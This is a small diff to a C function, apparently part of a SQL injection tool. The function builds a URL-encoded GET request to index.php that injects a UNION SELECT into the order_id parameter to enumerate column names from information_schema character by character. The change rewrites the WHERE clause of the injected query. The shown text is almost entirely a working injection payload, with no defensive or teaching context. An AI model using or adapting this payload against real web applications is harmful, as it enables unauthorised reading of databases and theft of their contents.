@@ -256,7 +256,7 @@ bool check_column(const void *ctx) {
     const char *fmt =
         "GET /index.php?order_id=0%%20UNION%%20SELECT%%20column_name%%20"
         "FROM%%20information_schema.COLUMNS%%20"
-        "WHERE%%20LOWER%%28table_name%%29%%3dLOWER%%28%%27%s%%27%%29%%20" // %s = table_name
+        "WHERE%%20table_name%%3d%%27%s%%27%%20" // %s = table_name
         "AND%%20column_name%%20LIKE%%20%%27%%25%s%%25%%27%%20" // %s = col_to_find
         "AND%%20column_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = discovered
         "AND%%20CHAR_LENGTH(column_name)>CHAR_LENGTH(%%27%s%%27)%%20"
